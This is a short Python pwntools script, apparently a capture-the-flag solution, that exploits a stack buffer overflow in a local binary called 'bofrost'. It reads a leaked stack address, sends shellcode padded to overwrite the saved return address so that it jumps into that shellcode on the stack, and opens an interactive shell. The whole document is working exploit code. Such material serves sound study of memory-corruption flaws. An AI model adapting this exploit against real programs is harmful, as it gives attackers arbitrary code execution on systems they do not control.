from pwn import *
p = process("./bofrost")
context.binary = exe = ELF("./bofrost")

p.recvuntil(b"RSP = ")
stack_leak = int(p.recvline().strip().decode(), 16)

msg = asm(shellcraft.sh()).ljust(256, b"A") + b"B"*8 + p64(stack_leak + 0x10)
p.sendline(msg)
p.interactive()
